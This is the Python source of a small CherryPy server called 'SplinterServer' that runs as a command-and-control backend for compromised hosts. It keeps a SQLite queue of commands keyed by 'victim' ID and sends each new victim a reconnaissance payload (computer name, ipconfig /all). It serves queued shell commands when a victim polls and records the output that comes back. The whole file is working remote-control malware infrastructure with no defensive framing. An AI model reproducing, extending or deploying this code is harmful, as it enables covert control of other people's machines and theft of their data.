import cherrypy
import time
import sqlite3

DB_STRING = "splinter.db"
FIRSTRUN = '''
$env:computername
ipconfig /all
'''

# SQLITE3
# CREATE TABLE commands (uuid, command_time, command, response, poll_time, response_time);
# uuid - victim ID
# command_time - the time a command was issued (server-side time)
# command - the command to be run
# response - the output from running the command
# poll_time - the time a command was requested from the controller (client-side time). Associates a command/response pair.
# response_time - the time a response was received (server-side time)

class SplinterServer(object):
    @cherrypy.expose
    def c(self, i, t):
        if i and t:
            with sqlite3.connect(DB_STRING,isolation_level='IMMEDIATE') as c:
                
                # Check for first run
                r = c.execute("SELECT rowid from commands where uuid=?",(i,))
                if not r.fetchone():
                    r = c.execute("INSERT into commands (uuid,poll_time,command_time,command) values (?,?,strftime('%s','now'),?)",(i,t,FIRSTRUN))
                    return FIRSTRUN

                # Existing victim - get the oldest command that hasn't been claimed
                r = c.execute("SELECT rowid, command from commands where poll_time is NULL and uuid=? order by command_time ASC", (i,))
                command =  r.fetchone()
                
                if command:
                    #Update the row to indicate the command has been claimed
                    c.execute("UPDATE commands set poll_time = ? where rowid = ?",(t,command[0]))
                    return command[1]

    @cherrypy.expose
    def r(self,**vars):
        if vars['i'] and vars['t']:
            with sqlite3.connect(DB_STRING) as c:
                rawbody = cherrypy.request.body.read()
                r = c.execute("UPDATE commands set response = ?, response_time = strftime('%s','now') where poll_time = ? and uuid = ?",(rawbody,vars['t'],vars['i']))

    @cherrypy.expose
    def default(self, *args, **kwargs):
        return ""

if __name__ == '__main__':
    cherrypy.quickstart(SplinterServer())
